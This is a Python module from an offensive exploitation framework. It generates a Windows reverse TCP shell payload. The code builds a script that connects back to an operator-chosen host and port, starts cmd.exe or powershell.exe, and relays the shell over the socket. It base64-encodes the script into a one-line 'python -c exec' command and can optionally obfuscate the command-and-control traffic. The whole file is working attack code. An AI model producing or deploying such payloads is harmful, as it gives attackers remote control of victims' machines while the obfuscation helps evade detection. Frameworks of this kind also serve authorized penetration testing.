from kittysploit import *
import base64


class Module(Payload):

	CLIENT_LANGUAGE = "python"

	__info__ = {
		'name': 'Windows Command Shell, Reverse TCP (via Python)',
		'description': 'Connect back and create a command shell via Python (works on Windows; uses subprocess+threads, no dup2)',
		'category': 'singles',
		'arch': Arch.PYTHON,
		'platform': Platform.WINDOWS,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(5555, 'Bind Port', True)
	shell_binary = OptString('cmd.exe', 'Shell to use (cmd.exe or powershell.exe)', True, True)
	python_binary = OptString("python", "Python binary (python or py)", True)
	encoder = OptString("", "Encoder", False, True)

	def generate(self):
		host = str(self.lhost)
		port = int(self.lport)
		shell = str(self.shell_binary).replace("'", "'\"'\"'")
		py = str(self.python_binary)

		obf = self._get_obfuscator_instance()
		if obf is not None and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
			client_code = obf.generate_client_code(self._get_client_language())
			if client_code:
				# Obfuscated C2: same obfuscator/key as listener so traffic matches
				on_connect = "_obf_send_client_hello(s)\n" if "_obf_send_client_hello" in client_code else ""
				script = (
					"import socket,subprocess,threading\n"
					+ client_code + "\n"
					+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
					+ f"s.connect(('{host}',{port}))\n"
					+ on_connect
					+ f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
					"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_obf_decode(d)); p.stdin.flush()\n"
					"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_obf_encode(buf)); buf=b''\n if buf: s.sendall(_obf_encode(buf))\n"
					"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
				)
				encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
				return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
		if obf is not None and not self._is_obfuscator_compatible(obf):
			from core.output_handler import print_warning
			lang = self._get_client_language() or "?"
			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
			print_warning(f"Obfuscator does not support client language '{lang}' for this payload (supported: {supported}). Generating without obfuscation.")

		# No obfuscator or incompatible: raw relay (listener must NOT use obfuscator)
		script = (
			"import socket,subprocess,threading\n"
			f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
			f"s.connect(('{host}',{port}))\n"
			f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
			"def r():\n"
			" while True:\n"
			"  try: d=s.recv(4096)\n"
			"  except: break\n"
			"  if not d: break\n"
			"  p.stdin.write(d); p.stdin.flush()\n"
			"def w():\n"
			" buf=b''\n"
			" while True:\n"
			"  try: c=p.stdout.read(1)\n"
			"  except: break\n"
			"  if not c: break\n"
			"  buf+=c\n"
			"  if c==b'\\n' or len(buf)>=64: s.sendall(buf); buf=b''\n"
			" if buf: s.sendall(buf)\n"
			"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\n"
			"t1.daemon=t2.daemon=True\n"
			"t1.start();t2.start()\n"
			"t1.join();t2.join()\n"
		)
		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
